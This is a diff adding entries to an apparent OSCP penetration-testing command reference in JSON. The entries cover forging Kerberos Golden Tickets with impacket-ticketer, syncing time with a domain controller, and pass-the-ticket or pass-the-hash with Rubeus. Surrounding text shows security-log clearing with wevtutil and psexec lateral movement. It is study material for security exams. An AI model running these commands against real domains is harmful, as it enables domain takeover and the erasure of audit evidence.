@@ -548,6 +548,77 @@
       ],
       "oscp_relevance": "medium",
       "notes": "OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In OSCP, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows:\nklist purge\n\nComplete cleanup:\nklist purge && net use * /delete /y\n\nEvent log cleanup (requires admin):\nwevtutil cl Security\nwevtutil cl System\n\nAlternative: Reboot (clears all tickets):\nshutdown /r /t 0\n\nTIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)"
+    },
+    {
+      "id": "ad-golden-ticket-ticketer-create",
+      "name": "Create Golden Ticket with Impacket Ticketer",
+      "category": "active-directory",
+      "subcategory": "kerberos",
+      "command": "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>",
+      "example": "impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator",
+      "description": "Forge a Golden Ticket TGT using Impacket's ticketer tool from Linux",
+      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "GOLDEN_TICKET", "IMPACKET", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<KRBTGT_HASH>", "description": "NTLM hash of krbtgt account", "example": "aad3b435b51404eeaad3b435b51404ee", "required": true},
+        {"name": "<DOMAIN_SID>", "description": "Domain Security Identifier", "example": "S-1-5-21-1234567890-1234567890-1234567890", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain FQDN", "example": "corp.local", "required": true},
+        {"name": "<USERNAME>", "description": "User to impersonate", "example": "Administrator", "required": true}
+      ],
+      "flag_explanations": {
+        "-nthash": "NTLM hash of krbtgt account (obtained via DCSync)",
+        "-domain-sid": "Domain SID (obtain with lookupsid.py or from DCSync output)",
+        "-domain": "Target domain FQDN"
+      },
+      "success_indicators": ["Saving ticket in <USERNAME>.ccache", "Ticket saved"],
+      "failure_indicators": ["Invalid hash format", "Error creating ticket"],
+      "notes": "Creates .ccache file. Export: export KRB5CCNAME=Administrator.ccache. Then use with: psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "kerberos-time-sync",
+      "name": "Sync Time with Domain Controller",
+      "category": "active-directory",
+      "subcategory": "kerberos",
+      "command": "ntpdate -u <DC_IP>",
+      "example": "ntpdate -u 192.168.50.70",
+      "description": "Synchronize attacker machine time with DC for Kerberos authentication (required within 5 minute skew)",
+      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "TIME_SYNC", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<DC_IP>", "description": "Domain Controller IP address", "example": "192.168.50.70", "required": true}
+      ],
+      "flag_explanations": {
+        "-u": "Use unprivileged port for NTP query"
+      },
+      "success_indicators": ["offset", "adjust time server"],
+      "failure_indicators": ["no server suitable for synchronization found"],
+      "notes": "Kerberos requires <5 minute clock skew. Essential before ticket operations. Alternative: rdate -n <DC_IP> or faketime for non-root.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "kerberos-rubeus-asktgt",
+      "name": "Request TGT with Rubeus",
+      "category": "active-directory",
+      "subcategory": "kerberos",
+      "command": "Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN> /ptt",
+      "example": "Rubeus.exe asktgt /user:Administrator /password:Password123! /domain:corp.local /ptt",
+      "description": "Request a TGT for specified user and inject into current session",
+      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "RUBEUS", "TGT", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<USER>", "description": "Username to authenticate as", "example": "Administrator", "required": true},
+        {"name": "<PASS>", "description": "User's password", "example": "Password123!", "required": true},
+        {"name": "<DOMAIN>", "description": "Domain FQDN", "example": "corp.local", "required": true}
+      ],
+      "flag_explanations": {
+        "asktgt": "Request TGT from KDC",
+        "/user": "Target username",
+        "/password": "User password (alt: /rc4, /aes256 for hash)",
+        "/domain": "Target domain",
+        "/ptt": "Pass-The-Ticket - inject into current session"
+      },
+      "success_indicators": ["[+] TGT request successful!", "Ticket successfully imported!"],
+      "failure_indicators": ["KDC_ERR_PREAUTH_FAILED", "Client not found in Kerberos database"],
+      "notes": "Use /rc4:<hash> or /aes256:<hash> instead of /password for pass-the-hash. Verify with: klist",
+      "oscp_relevance": "high"
     }
   ]
 }
